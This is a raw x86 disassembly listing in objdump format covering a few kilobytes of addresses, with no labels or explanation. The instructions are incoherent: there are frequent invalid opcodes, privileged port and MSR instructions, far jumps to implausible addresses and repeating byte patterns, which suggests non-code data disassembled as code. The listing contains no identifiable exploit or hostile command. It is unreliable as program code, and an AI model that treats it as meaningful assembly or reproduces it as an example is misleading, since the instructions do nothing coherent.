  405dac:	dc f3                	fdiv   %st,%st(3)
  405dae:	13 e7                	adc    %edi,%esp
  405db0:	ad                   	lods   %ds:(%esi),%eax
  405db1:	ca c7 7f             	lret   $0x7fc7
  405db4:	56                   	push   %esi
  405db5:	0f eb 9f 0b ff dd b5 	por    -0x4a2200f5(%edi),%mm3
  405dbc:	65 72 af             	gs jb  0x405d6e
  405dbf:	be fa ff ad 57       	mov    $0x57adfffa,%esi
  405dc4:	73 a7                	jae    0x405d6d
  405dc6:	fd                   	std
  405dc7:	b4 9a                	mov    $0x9a,%ah
  405dc9:	1c d5                	sbb    $0xd5,%al
  405dcb:	ce                   	into
  405dcc:	ff 6f 51             	ljmp   *0x51(%edi)
  405dcf:	dd 19                	fstpl  (%ecx)
  405dd1:	fd                   	std
  405dd2:	43                   	inc    %ebx
  405dd3:	be 98 c9 af f5       	mov    $0xf5afc998,%esi
  405dd8:	39 3d 29 f2 ac fc    	cmp    %edi,0xfcacf229
  405dde:	5a                   	pop    %edx
  405ddf:	9f                   	lahf
  405de0:	58                   	pop    %eax
  405de1:	f8                   	clc
  405de2:	b5 a2                	mov    $0xa2,%ch
  405de4:	43                   	inc    %ebx
  405de5:	64 1d b5 94 c1 85    	fs sbb $0x85c194b5,%eax
  405deb:	b4 a3                	mov    $0xa3,%ah
  405ded:	b8 96 6a f2 d6       	mov    $0xd6f26a96,%eax
  405df2:	8c 30                	mov    %?,(%eax)
  405df4:	9a ac b5 33 fd 18 96 	lcall  $0x9618,$0xfd33b5ac
  405dfb:	d3 0a                	rorl   %cl,(%edx)
  405dfd:	50                   	push   %eax
  405dfe:	48                   	dec    %eax
  405dff:	23 7b 4f             	and    0x4f(%ebx),%edi
  405e02:	26 6f                	outsl  %es:(%esi),(%dx)
  405e04:	e7 bc                	out    %eax,$0xbc
  405e06:	4c                   	dec    %esp
  405e07:	7e c5                	jle    0x405dce
  405e09:	ef                   	out    %eax,(%dx)
  405e0a:	e9 cf 57 7d fc       	jmp    0xfcbdb5de
  405e0f:	1f                   	pop    %ds
  405e10:	9f                   	lahf
  405e11:	86 1f                	xchg   %bl,(%edi)
  405e13:	d0 0a                	rorb   $1,(%edx)
  405e15:	c6                   	(bad)
  405e16:	cf                   	iret
  405e17:	32 50 7d             	xor    0x7d(%eax),%dl
  405e1a:	75 67                	jne    0x405e83
  405e1c:	c2 19 09             	ret    $0x919
  405e1f:	11 10                	adc    %edx,(%eax)
  405e21:	85 3f                	test   %edi,(%edi)
  405e23:	33 f0                	xor    %eax,%esi
  405e25:	27                   	daa
  405e26:	1a 7f ac             	sbb    -0x54(%edi),%bh
  405e29:	f8                   	clc
  405e2a:	13 83 3f 36 fc 99    	adc    -0x6603c9c1(%ebx),%eax
  405e30:	89 3f                	mov    %edi,(%edi)
  405e32:	b1 f8                	mov    $0xf8,%cl
  405e34:	13 87 3f 76 fc 89    	adc    -0x760389c1(%edi),%eax
  405e3a:	c7                   	(bad)
  405e3b:	9f                   	lahf
  405e3c:	04 fc                	add    $0xfc,%al
  405e3e:	49                   	dec    %ecx
  405e3f:	c4 9f 24 fc 49 c6    	les    -0x39b603dc(%edi),%ebx
  405e45:	9f                   	lahf
  405e46:	14 fc                	adc    $0xfc,%al
  405e48:	49                   	dec    %ecx
  405e49:	c5 9f 74 fc c9 c0    	lds    -0x3f36038c(%edi),%ebx
  405e4f:	9f                   	lahf
  405e50:	4c                   	dec    %esp
  405e51:	fc                   	cld
  405e52:	c9                   	leave
  405e53:	c2 9f d9             	ret    $0xd99f
  405e56:	f8                   	clc
  405e57:	33 07                	xor    (%edi),%eax
  405e59:	7f e6                	jg     0x405e41
  405e5b:	e2 4f                	loop   0x405eac
  405e5d:	36 fe cc             	ss dec %ah
  405e60:	c3                   	ret
  405e61:	9f                   	lahf
  405e62:	1c fc                	sbb    $0xfc,%al
  405e64:	09 05 be b3 b3 22    	or     %eax,0x22b3b3be
  405e6a:	4d                   	dec    %ebp
  405e6b:	d8 16                	fcoms  (%esi)
  405e6d:	b7 33                	mov    $0x33,%bh
  405e6f:	90                   	nop
  405e70:	61                   	popa
  405e71:	50                   	push   %eax
  405e72:	00 fc                	add    %bh,%ah
  405e74:	4d                   	dec    %ebp
  405e75:	6d                   	insl   (%dx),%es:(%edi)
  405e76:	29 d1                	sub    %edx,%ecx
  405e78:	41                   	inc    %ecx
  405e79:	ac                   	lods   %ds:(%esi),%al
  405e7a:	26 ae                	es scas %es:(%edi),%al
  405e7c:	27                   	daa
  405e7d:	b6 11                	mov    $0x11,%dh
  405e7f:	5d                   	pop    %ebp
  405e80:	44                   	inc    %esp
  405e81:	0f 32                	rdmsr
  405e83:	16                   	push   %ss
  405e84:	8e 27                	mov    (%edi),%fs
  405e86:	7b 37                	jnp    0x405ebf
  405e88:	71 88                	jno    0x405e12
  405e8a:	b8 9f 5a db 4b       	mov    $0x4bdb5a9f,%eax
  405e8f:	bc 49 6d 9f ed       	mov    $0xed9f6d49,%esp
  405e94:	8c 8b 46 7b 6b 66    	mov    %cs,0x666b7b46(%ebx)
  405e9a:	22 b2 31 93 c7 cd    	and    -0x32386ccf(%edx),%dh
  405ea0:	4b                   	dec    %ebx
  405ea1:	13 d8                	adc    %eax,%ebx
  405ea3:	e9 71 79 68 bb       	jmp    0xbba8d819
  405ea8:	2c 45                	sub    $0x45,%al
  405eaa:	70 07                	jo     0x405eb3
  405eac:	2a e5                	sub    %ch,%ah
  405eae:	30 8f 71 bd 80 8d    	xor    %cl,-0x727f428f(%edi)
  405eb4:	46                   	inc    %esi
  405eb5:	d7                   	xlat   %ds:(%ebx)
  405eb6:	82 83 dd 97 dc 8c f6 	addb   $0xf6,-0x73236823(%ebx)
  405ebd:	bd 59 9b 90 47       	mov    $0x47909b59,%ebp
  405ec2:	99                   	cltd
  405ec3:	f9                   	stc
  405ec4:	6f                   	outsl  %ds:(%esi),(%dx)
  405ec5:	db 36                	(bad) (%esi)
  405ec7:	84 38                	test   %bh,(%eax)
  405ec9:	91                   	xchg   %eax,%ecx
  405eca:	97                   	xchg   %eax,%edi
  405ecb:	66 b9 f1 5d          	mov    $0x5df1,%cx
  405ecf:	39 6b d6             	cmp    %ebp,-0x2a(%ebx)
  405ed2:	36 d4 af             	ss aam $0xaf
  405ed5:	4f                   	dec    %edi
  405ed6:	da 09                	fimull (%ecx)
  405ed8:	6d                   	insl   (%dx),%es:(%edi)
  405ed9:	ec                   	in     (%dx),%al
  405eda:	56                   	push   %esi
  405edb:	fb                   	sti
  405edc:	20 da                	and    %bl,%dl
  405ede:	17                   	pop    %ss
  405edf:	a1 ed 62 4f db       	mov    0xdb4f62ed,%eax
  405ee4:	ce                   	into
  405ee5:	c7                   	(bad)
  405ee6:	b7 91                	mov    $0x91,%bh
  405ee8:	33 92 af 82 31 88    	xor    -0x77ce7d51(%edx),%edx
  405eee:	9c                   	pushf
  405eef:	75 3d                	jne    0x405f2e
  405ef1:	46                   	inc    %esi
  405ef2:	b2 3f                	mov    $0x3f,%dl
  405ef4:	ee                   	out    %al,(%dx)
  405ef5:	20 ec                	and    %ch,%ah
  405ef7:	66 fb                	data16 sti
  405ef9:	52                   	push   %edx
  405efa:	ef                   	out    %eax,(%dx)
  405efb:	83 21 46             	andl   $0x46,(%ecx)
  405efe:	71 b2                	jno    0x405eb2
  405f00:	ef                   	out    %eax,(%dx)
  405f01:	52                   	push   %edx
  405f02:	1f                   	pop    %ds
  405f03:	85 67 60             	test   %esp,0x60(%edi)
  405f06:	77 d2                	ja     0x405eda
  405f08:	e3 f0                	jecxz  0x405efa
  405f0a:	22 fc                	and    %ah,%bh
  405f0c:	25 e3 19 dc 19       	and    $0x19dc19e3,%eax
  405f11:	17                   	pop    %ss
  405f12:	c6                   	(bad)
  405f13:	bf 80 76 79 d6       	mov    $0xd6797680,%edi
  405f18:	21 d8                	and    %ebx,%eax
  405f1a:	cf                   	iret
  405f1b:	46                   	inc    %esi
  405f1c:	6d                   	insl   (%dx),%es:(%edi)
  405f1d:	0c 2e                	or     $0x2e,%al
  405f1f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405f20:	48                   	dec    %eax
  405f21:	46                   	inc    %esi
  405f22:	d8 11                	fcoms  (%ecx)
  405f24:	e5 6d                	in     $0x6d,%eax
  405f26:	e4 7d                	in     $0x7d,%al
  405f28:	c9                   	leave
  405f29:	7f 85                	jg     0x405eb0
  405f2b:	9b d8 63 71          	fsubs  0x71(%ebx)
  405f2f:	9f                   	lahf
  405f30:	c0 5f d5 be          	rcrb   $0xbe,-0x2b(%edi)
  405f34:	62 fb e3             	(bad) {rd-bad},{%k6}{z}
  405f37:	be 40 db 15 fd       	mov    $0xfd15db40,%esi
  405f3c:	0d b6 7c 45 1c       	or     $0x1c457cb6,%eax
  405f41:	63 bb 59 54 d2 41    	arpl   %edi,0x41d25459(%ebx)
  405f47:	b8 83 cd ce b4       	mov    $0xb4cecd83,%eax
  405f4c:	b0 3b                	mov    $0x3b,%al
  405f4e:	d8 d5                	fcom   %st(5)
  405f50:	31 e1                	xor    %esp,%ecx
  405f52:	48                   	dec    %eax
  405f53:	27                   	daa
  405f54:	71 66                	jno    0x405fbc
  405f56:	c2 0c e4             	ret    $0xe40c
  405f59:	d9 b3 c2 d9 18 2b    	fnstenv 0x2b18d9c2(%ebx)
  405f5f:	c9                   	leave
  405f60:	8c 65 cf             	mov    %fs,-0x31(%ebp)
  405f63:	50                   	push   %eax
  405f64:	0c cf                	or     $0xcf,%al
  405f66:	b0 9b                	mov    $0x9b,%al
  405f68:	62 13                	bound  %edx,(%ebx)
  405f6a:	19 8f 2a 95 7d 05    	sbb    %ecx,0x57d952a(%edi)
  405f70:	fc                   	cld
  405f71:	3b 54 9f 42          	cmp    0x42(%edi,%ebx,4),%edx
  405f75:	62 7c 2e d9          	bound  %edi,-0x27(%esi,%ebp,1)
  405f79:	0c 0e                	or     $0xe,%al
  405f7b:	63 9d 65 ec 53 b8    	arpl   %ebx,-0x47ac139b(%ebp)
  405f81:	2e b5 14             	cs mov $0x14,%ch
  405f84:	79 55                	jns    0x405fdb
  405f86:	6c                   	insb   (%dx),%es:(%edi)
  405f87:	25 ea bf c6 ac       	and    $0xacc6bfea,%eax
  405f8c:	ef                   	out    %eax,(%dx)
  405f8d:	60                   	pusha
  405f8e:	db 53 1a             	fistl  0x1a(%ebx)
  405f91:	d8 a7 ec e3 8c 66    	fsubs  0x668ce3ec(%edi)
  405f97:	f6 15 d6 d9 84 bc    	notb   0xbc84d9d6
  405f9d:	de ea                	fsubrp %st,%st(2)
  405f9f:	62 a1 ca e7 a9 5b    	bound  %esp,0x5ba9e7ca(%ecx)
  405fa5:	91                   	xchg   %eax,%ecx
  405fa6:	33 52 90             	xor    -0x70(%edx),%edx
  405fa9:	ec                   	in     (%dx),%al
  405faa:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405fab:	94                   	xchg   %eax,%esp
  405fac:	6e                   	outsb  %ds:(%esi),(%dx)
  405fad:	e4 72                	in     $0x72,%al
  405faf:	ab                   	stos   %eax,%es:(%edi)
  405fb0:	8f                   	(bad)
  405fb1:	59                   	pop    %ecx
  405fb2:	95                   	xchg   %eax,%ebp
  405fb3:	45                   	inc    %ebp
  405fb4:	f6 70 96             	divb   -0x6a(%eax)
  405fb7:	a0 50 cc ca cc       	mov    0xcccacc50,%al
  405fbc:	b8 41 36 c2 0e       	mov    $0xec23641,%eax
  405fc1:	45                   	inc    %ebp
  405fc2:	bf 8d 76 6a dc       	mov    $0xdc6a768d,%edi
  405fc7:	39 cc                	cmp    %ecx,%esp
  405fc9:	4a                   	dec    %edx
  405fca:	39 ee                	cmp    %ebp,%esi
  405fcc:	66 07                	popw   %es
  405fce:	53                   	push   %ebx
  405fcf:	af                   	scas   %es:(%edi),%eax
  405fd0:	60                   	pusha
  405fd1:	05 ca a7 09 c3       	add    $0xc309a7ca,%eax
  405fd6:	6c                   	insb   (%dx),%es:(%edi)
  405fd7:	a9 12 c0 b7 06       	test   $0x6b7c012,%eax
  405fdc:	87 a2 24 fc 92 39    	xchg   %esp,0x3992fc24(%edx)
  405fe2:	94                   	xchg   %eax,%esp
  405fe3:	af                   	scas   %es:(%edi),%eax
  405fe4:	ac                   	lods   %ds:(%esi),%al
  405fe5:	dc ee                	fsubr  %st,%st(6)
  405fe7:	8b 51 7b             	mov    0x7b(%ecx),%edx
  405fea:	ef                   	out    %eax,(%dx)
  405feb:	16                   	push   %ss
  405fec:	8c b6 14 73 ac 56    	mov    %?,0x56ac7314(%esi)
  405ff2:	78 fc                	js     0x405ff0
  405ff4:	33 31                	xor    (%ecx),%esi
  405ff6:	ce                   	into
  405ff7:	f7 d9                	neg    %ecx
  405ff9:	7a 96                	jp     0x405f91
  405ffb:	8d a3 30 13 be 4b    	lea    0x4bbe1330(%ebx),%esp
  406001:	fd                   	std
  406002:	88 cd                	mov    %cl,%ch
  406004:	84 f8                	test   %bh,%al
  406006:	b4 cf                	mov    $0xcf,%ah
  406008:	48                   	dec    %eax
  406009:	f9                   	stc
  40600a:	1a af 7e 6c 72 b6    	sbb    -0x498d9382(%edi),%ch
  406010:	92                   	xchg   %eax,%edx
  406011:	8c 75 96             	mov    %?,-0x6a(%ebp)
  406014:	2a 6d 4a             	sub    0x4a(%ebp),%ch
  406017:	da ac d5 4a 28 5b 66 	fisubrl 0x665b284a(%ebp,%edx,8)
  40601e:	69 43 f2 b7 92 50 f6 	imul   $0xf65092b7,-0xe(%ebx),%eax
  406025:	57                   	push   %edi
  406026:	73 97                	jae    0x405fbf
  406028:	62 c2 79             	(bad) {rd-bad},{%k3}{z}
  40602b:	bb 07 99 0e 27       	mov    $0x270e9907,%ebx
  406030:	21 67 41             	and    %esp,0x41(%edi)
  406033:	00 99 0d a7 20 e7    	add    %bl,-0x18df58f3(%ecx)
  406039:	c3                   	ret
  40603a:	69 c8 7c 38 03 b9    	imul   $0xb903387c,%eax,%ecx
  406040:	08 ce                	or     %cl,%dh
  406042:	44                   	inc    %esp
  406043:	96                   	xchg   %eax,%esi
  406044:	c0 59 0a ff          	rcrb   $0xff,0xa(%ecx)
  406048:	fe                   	(bad)
  406049:	e2 39                	loop   0x406084
  40604b:	c8 52 38 0f          	enter  $0x3852,$0xf
  40604f:	59                   	pop    %ecx
  406050:	0e                   	push   %cs
  406051:	fb                   	sti
  406052:	90                   	nop
  406053:	55                   	push   %ebp
  406054:	70 01                	jo     0x406057
  406056:	b2 06                	mov    $0x6,%dl
  406058:	2e 42                	cs inc %edx
  40605a:	36 c0 25 c8 66 b8 0c 	shlb   $0xd9,%ss:0xcb866c8
  406061:	d9 
  406062:	0a 57 20             	or     0x20(%edi),%dl
  406065:	8f 81 03 48 27 5c    	pop    0x5c274803(%ecx)
  40606b:	8d                   	lea    (bad),%ebp
  40606c:	ec                   	in     (%dx),%al
  40606d:	84 61 e4             	test   %ah,-0x1c(%ecx)
  406070:	56                   	push   %esi
  406071:	b8 56 e1 7f 72       	mov    $0x727fe156,%eax
  406076:	f7 7a 64             	idivl  0x64(%edx)
  406079:	1f                   	pop    %ds
  40607a:	fc                   	cld
  40607b:	12 d9                	adc    %cl,%bl
  40607d:	0f bf 42 ee          	movswl -0x12(%edx),%eax
  406081:	82 83 c8 3d 70 0b 32 	addb   $0x32,0xb703dc8(%ebx)
  406088:	00 bf 46 9e 06 b7    	add    %bh,-0x48f961ba(%edi)
  40608e:	23 cf                	and    %edi,%ecx
  406090:	84 3b                	test   %bh,(%ebx)
  406092:	91                   	xchg   %eax,%ecx
  406093:	e7 c0                	out    %eax,$0xc0
  406095:	dd c8                	(bad)
  406097:	7d 70                	jge    0x406109
  406099:	2f                   	das
  40609a:	f2 22 b8 1f 79 19 3c 	repnz and 0x3c19791f(%eax),%bh
  4060a1:	88 9c 69 e0 f1 c7 1b 	mov    %bl,0x1bc7f1e0(%ecx,%ebp,2)
  4060a8:	78 fc                	js     0x4060a6
  4060aa:	c9                   	leave
  4060ab:	06                   	push   %es
  4060ac:	1e                   	push   %ds
  4060ad:	7f ba                	jg     0x406069
  4060af:	81 c7 3f cb c0 e3    	add    $0xe3c0cb3f,%edi
  4060b5:	cf                   	iret
  4060b6:	36 f0 f8             	ss lock clc
  4060b9:	e7 1b                	out    %eax,$0x1b
  4060bb:	78 fc                	js     0x4060b9
  4060bd:	f9                   	stc
  4060be:	06                   	push   %es
  4060bf:	1e                   	push   %ds
  4060c0:	ff 22                	jmp    *(%edx)
  4060c2:	03 8f bf c4 c0 e3    	add    -0x1c3f3b41(%edi),%ecx
  4060c8:	5f                   	pop    %edi
  4060c9:	61                   	popa
  4060ca:	78 98                	js     0x406064
  4060cc:	e7 62                	out    %eax,$0x62
  4060ce:	78 84                	js     0x406054
  4060d0:	e7 62                	out    %eax,$0x62
  4060d2:	a0 5c 0c 94 8b       	mov    0x8b940c5c,%al
  4060d7:	81 72 31 50 2e 86 51 	xorl   $0x51862e50,0x31(%edx)
  4060de:	9e                   	sahf
  4060df:	8b 81 67 74 8c 81    	mov    -0x7e738b99(%ecx),%eax
  4060e5:	67 e4 34             	addr16 in $0x34,%al
  4060e8:	fc                   	cld
  4060e9:	96                   	xchg   %eax,%esi
  4060ea:	e7 62                	out    %eax,$0x62
  4060ec:	e0 79                	loopne 0x406167
  4060ee:	6d                   	insl   (%dx),%es:(%edi)
  4060ef:	35 f0 bc ba 0d       	xor    $0xdbabcf0,%eax
  4060f4:	3c af                	cmp    $0xaf,%al
  4060f6:	3e 03 cf             	ds add %edi,%ecx
  4060f9:	ab                   	stos   %eax,%es:(%edi)
  4060fa:	df c0                	ffreep %st(0)
  4060fc:	f3 da 65 e0          	repz fisubl -0x20(%ebp)
  406100:	79 ed                	jns    0x4060ef
  406102:	31 f0                	xor    %esi,%eax
  406104:	bc 02 06 9e d7       	mov    $0xd79e0602,%esp
  406109:	69 06 9e d7 99 06    	imul   $0x699d79e,(%esi),%eax
  40610f:	9e                   	sahf
  406110:	d7                   	xlat   %ds:(%ebx)
  406111:	39 06                	cmp    %eax,(%esi)
  406113:	9e                   	sahf
  406114:	d7                   	xlat   %ds:(%ebx)
  406115:	3e 03 cf             	ds add %edi,%ecx
  406118:	eb 22                	jmp    0x40613c
  40611a:	03 cf                	add    %edi,%ecx
  40611c:	eb 32                	jmp    0x406150
  40611e:	03 cf                	add    %edi,%ecx
  406120:	eb 80                	jmp    0x4060a2
  406122:	81 e7 35 6c e0 79    	and    $0x79e06c35,%edi
  406128:	5d                   	pop    %ebp
  406129:	6f                   	outsl  %ds:(%esi),(%dx)
  40612a:	78 1c                	js     0x406148
  40612c:	f9                   	stc
  40612d:	2b c3                	sub    %ebx,%eax
  40612f:	93                   	xchg   %eax,%ebx
  406130:	c8 5b 0c 4f          	enter  $0xc5b,$0x4f
  406134:	2b fc                	sub    %esp,%edi
  406136:	ef                   	out    %eax,(%dx)
  406137:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406138:	f8                   	clc
  406139:	1d f2 6e c3 73       	sbb    $0x73c36ef2,%eax
  40613e:	c8 fb 0d cf          	enter  $0xdfb,$0xcf
  406142:	23 1f                	and    (%edi),%ebx
  406144:	36 fc                	ss cld
  406146:	01 39                	add    %edi,(%ecx)
  406148:	6a 78                	push   $0x78
  40614a:	09 f9                	or     %edi,%ecx
  40614c:	b8 e1 10 f2 69       	mov    $0x69f210e1,%eax
  406151:	c3                   	ret
  406152:	ff 20                	jmp    *(%eax)
  406154:	9f                   	lahf
  406155:	33 bc 8a fc 83 e1 35 	xor    0x35e183fc(%edx,%ecx,4),%edi
  40615c:	e4 21                	in     $0x21,%al
  40615e:	c3                   	ret
  40615f:	1b c8                	sbb    %eax,%ecx
  406161:	57                   	push   %edi
  406162:	0d 6f 22 df 30       	or     $0x30df226f,%eax
  406167:	8c 23                	mov    %fs,(%ebx)
  406169:	c7                   	(bad)
  40616a:	0d 7f 41 be 63       	or     $0x63be417f,%eax
  40616f:	78 47                	js     0x4061b8
  406171:	09 81 66 d3 7b c8    	or     %eax,-0x37842c9a(%ecx)
  406177:	56                   	push   %esi
  406178:	d3 87 c8 63 4c ff    	roll   %cl,-0xb39c38(%edi)
  40617e:	40                   	inc    %eax
  40617f:	3a 89 9d c4 ad a6    	cmp    -0x59523b63(%ecx),%cl
  406185:	cf                   	iret
  406186:	91                   	xchg   %eax,%ecx
  406187:	dd a6 af 91 7d a6    	frstor -0x59826e51(%esi)
  40618d:	23 c8                	and    %eax,%ecx
  40618f:	7e 93                	jle    0x406124
  406191:	d1 10                	rcll   $1,(%eax)
  406193:	02 bb 88 7b 4c a1    	add    -0x5eb38478(%ebx),%bh
  406199:	c8 00 b5 70          	enter  $0xb500,$0x70
  40619d:	9a 29 ca 80 51 99 f8 	lcall  $0xf899,$0x5180ca29
  4061a4:	58                   	pop    %eax
  4061a5:	3c 6c                	cmp    $0x6c,%al
  4061a7:	e2 63                	loop   0x40620c
  4061a9:	31 6a e2             	xor    %ebp,-0x1e(%edx)
  4061ac:	63 f1                	arpl   %esi,%ecx
  4061ae:	b8 89 8f c5 73       	mov    $0x73c58f89,%eax
  4061b3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4061b4:	ff 01                	incl   (%ecx)
  4061b6:	f5                   	cmc
  4061b7:	10 78 95             	adc    %bh,-0x6b(%eax)
  4061ba:	ea bf 41 6d 8e 9b 6c 	ljmp   $0x6c9b,$0x8e6d41bf
  4061c1:	d8 c2                	fadd   %st(2),%st
  4061c3:	3b d4                	cmp    %esp,%edx
  4061c5:	da 07                	fiaddl (%edi)
  4061c7:	14 c3                	adc    $0xc3,%al
  4061c9:	df e9                	fucomip %st(1),%st
  4061cb:	2a ff                	sub    %bh,%bh
  4061cd:	30 c5                	xor    %al,%ch
  4061cf:	a3 f2 2f 53 0a       	mov    %eax,0xa532ff2
  4061d4:	f2 df 74 95 6f       	repnz fbstp 0x6f(%ebp,%edx,4)
  4061d9:	4d                   	dec    %ebp
  4061da:	99                   	cltd
  4061db:	48                   	dec    %eax
  4061dc:	30 cf                	xor    %cl,%bh
  4061de:	45                   	inc    %ebp
  4061df:	1a cd                	sbb    %ch,%cl
  4061e1:	f3 91                	repz xchg %eax,%ecx
  4061e3:	21 e6                	and    %esp,%esi
  4061e5:	7f 28                	jg     0x40620f
  4061e7:	e9 f8 36 fc 9e       	jmp    0x9f3c98e4
  4061ec:	92                   	xchg   %eax,%edx
  4061ed:	41                   	inc    %ecx
  4061ee:	cc                   	int3
  4061ef:	83 70 a2 0d          	xorl   $0xd,-0x5e(%eax)
  4061f3:	be 36 e7 e1 8a       	mov    $0x8ae1e736,%esi
  4061f8:	6c                   	insb   (%dx),%es:(%edi)
  4061f9:	b0 e4                	mov    $0xe4,%al
  4061fb:	e1 da                	loope  0x4061d7
  4061fd:	9b                   	fwait
  4061fe:	89 cc                	mov    %ecx,%esp
  406200:	85 5c 64 11          	test   %ebx,0x11(%esp,%eiz,2)
  406204:	2c 43                	sub    $0x43,%al
  406206:	2e 27                	cs daa
  406208:	96                   	xchg   %eax,%esi
  406209:	11 d7                	adc    %edx,%edi
  40620b:	91                   	xchg   %eax,%ecx
  40620c:	de 04 a5 c8 a3 49 e9 	fiadds -0x16b65c38(,%eiz,4)
  406213:	20 6e 87             	and    %ch,-0x79(%esi)
  406216:	56                   	push   %esi
  406217:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406218:	1f                   	pop    %ds
  406219:	4e                   	dec    %esi
  40621a:	41                   	inc    %ecx
  40621b:	9e                   	sahf
  40621c:	08 e7                	or     %ah,%bh
  40621e:	5b                   	pop    %ebx
  40621f:	4a                   	dec    %edx
  406220:	a9 7d 07 d1 49       	test   $0x49d1077d,%eax
  406225:	74 11                	je     0x406238
  406227:	03 c4                	add    %esp,%eax
  406229:	21 e2                	and    %esp,%edx
  40622b:	30 71 84             	xor    %dh,-0x7c(%ecx)
  40622e:	38 4a 1c             	cmp    %cl,0x1c(%edx)
  406231:	27                   	daa
  406232:	02 e3                	add    %bl,%ah
  406234:	4c                   	dec    %esp
  406235:	27                   	daa
  406236:	96                   	xchg   %eax,%esi
  406237:	12 4f 65             	adc    0x65(%edi),%cl
  40623a:	3c ce                	cmp    $0xce,%al
  40623c:	51                   	push   %ecx
  40623d:	03 d5                	add    %ebp,%edx
  40623f:	21 82 91 ea 10 4b    	and    %eax,0x4b10ea91(%edx)
  406245:	89 4e e2             	mov    %ecx,-0x1e(%esi)
  406248:	61                   	popa
  406249:	22 33                	and    (%ebx),%dh
  40624b:	51                   	push   %ecx
  40624c:	8e 44 17 71          	mov    0x71(%edi,%edx,1),%es
  406250:	88 38                	mov    %bh,(%eax)
  406252:	42                   	inc    %edx
  406253:	1c 23                	sbb    $0x23,%al
  406255:	1e                   	push   %ds
  406256:	26 32 33             	xor    %es:(%ebx),%dh
  406259:	d5 24                	aad    $0x24
  40625b:	66 11 1d c4 32 a2 8b 	adc    %bx,0x8ba232c4
  406262:	38 44 1c 21          	cmp    %al,0x21(%esp,%ebx,1)
  406266:	8e 11                	mov    (%ecx),%ss
  406268:	0f 13 99 85 ce 25 96 	movlps %xmm3,-0x69da317b(%ecx)
  40626f:	5a                   	pop    %edx
  406270:	78 84                	js     0x4061f6
  406272:	0e                   	push   %cs
  406273:	b2 9d                	mov    $0x9d,%dl
  406275:	64 bb c8 1e 22 8e    	fs mov $0x8e221ec8,%ebx
  40627b:	10 c7                	adc    %al,%bh
  40627d:	88 e3                	mov    %ah,%bl
  40627f:	c4 c3 44 08          	(bad)
  406283:	a1 76 88 e9 c4       	mov    0xc4e98876,%eax
  406288:	0c 62                	or     $0x62,%al
  40628a:	29 d1                	sub    %edx,%ecx
  40628c:	41                   	inc    %ecx
  40628d:	74 12                	je     0x4062a1
  40628f:	5d                   	pop    %ebp
  406290:	c4 00                	les    (%eax),%eax
  406292:	71 88                	jno    0x40621c
  406294:	38 4c 1c 21          	cmp    %cl,0x21(%esp,%ebx,1)
  406298:	8e 12                	mov    (%edx),%ss
  40629a:	c7                   	(bad)
  40629b:	88 e3                	mov    %ah,%bl
  40629d:	c4 c3 44 08          	(bad)
  4062a1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4062a2:	f6 89 e9 c4 0c 62 29 	testb  $0x29,0x620cc4e9(%ecx)
  4062a9:	d1 41 74             	roll   $1,0x74(%ecx)
  4062ac:	12 5d c4             	adc    -0x3c(%ebp),%bl
  4062af:	00 71 88             	add    %dh,-0x78(%ecx)
  4062b2:	38 4c 1c 21          	cmp    %cl,0x21(%esp,%ebx,1)
  4062b6:	8e 12                	mov    (%edx),%ss
  4062b8:	c7                   	(bad)
  4062b9:	88 e3                	mov    %ah,%bl
  4062bb:	c4 c3 44 08          	(bad)
  4062bf:	a3 f6 89 e9 c4       	mov    %eax,0xc4e989f6
  4062c4:	0c 62                	or     $0x62,%al
  4062c6:	29 d1                	sub    %edx,%ecx
  4062c8:	41                   	inc    %ecx
  4062c9:	74 12                	je     0x4062dd
  4062cb:	5d                   	pop    %ebp
  4062cc:	c4 00                	les    (%eax),%eax
  4062ce:	71 88                	jno    0x406258
  4062d0:	38 4c 1c 21          	cmp    %cl,0x21(%esp,%ebx,1)
  4062d4:	8e 12                	mov    (%edx),%ss
  4062d6:	c7                   	(bad)
  4062d7:	88 e3                	mov    %ah,%bl
  4062d9:	c4 c3 6a cb          	(bad)
  4062dd:	e1 d4                	loope  0x4062b3
  4062df:	26 b1 94             	es mov $0x94,%cl
  4062e2:	e8 20 3a 89 2e       	call   0x2ec99d07
  4062e7:	62 80 38 44 1c 26    	bound  %eax,0x261c4438(%eax)
  4062ed:	8e 10                	mov    (%eax),%ss
  4062ef:	47                   	inc    %edi
  4062f0:	89 63 c4             	mov    %esp,-0x3c(%ebx)
  4062f3:	71 e2                	jno    0x4062d7
  4062f5:	61                   	popa
  4062f6:	22 44 50 cb          	and    -0x35(%eax,%edx,2),%al
  4062fa:	c4 74 62 06          	les    0x6(%edx,%eiz,2),%esi
  4062fe:	b1 94                	mov    $0x94,%cl
  406300:	e8 20 3a 89 2e       	call   0x2ec99d25
  406305:	62 80 38 44 1c 26    	bound  %eax,0x261c4438(%eax)
  40630b:	8e 10                	mov    (%eax),%ss
  40630d:	47                   	inc    %edi
  40630e:	89 63 c4             	mov    %esp,-0x3c(%ebx)
  406311:	71 e2                	jno    0x4062f5
  406313:	61                   	popa
  406314:	22 44 52 fb          	and    -0x5(%edx,%edx,2),%al
  406318:	c4 74 62 06          	les    0x6(%edx,%eiz,2),%esi
  40631c:	b1 94                	mov    $0x94,%cl
  40631e:	e8 20 ba 88 01       	call   0x1c91d43
  406323:	e2 10                	loop   0x406335
  406325:	71 98                	jno    0x4062bf
  406327:	38 42 1c             	cmp    %al,0x1c(%edx)
  40632a:	25 8e 11 c7 89       	and    $0x89c7118e,%eax
  40632f:	87 89 10 45 2d 13    	xchg   %ecx,0x132d4510(%ecx)
  406335:	d3 89 19 c4 52 a2    	rorl   %cl,-0x5dad3be7(%ecx)
  40633b:	83 e8 24             	sub    $0x24,%eax
  40633e:	ba 88 01 e2 10       	mov    $0x10e20188,%edx
  406343:	71 98                	jno    0x4062dd
  406345:	38 42 1c             	cmp    %al,0x1c(%edx)
  406348:	25 8e 11 c7 89       	and    $0x89c7118e,%eax
  40634d:	87 89 30 83 da 27    	xchg   %ecx,0x27da8330(%ecx)
  406353:	66 10 1d 44 27 d1 45 	data16 adc %bl,0x45d12744
  40635a:	0c 10                	or     $0x10,%al
  40635c:	87 88 c3 c4 11 e2    	xchg   %ecx,-0x1dee3b3d(%eax)
  406362:	28 71 8c             	sub    %dh,-0x74(%ecx)
  406365:	38 4e 3c             	cmp    %cl,0x3c(%esi)
  406368:	4c                   	dec    %esp
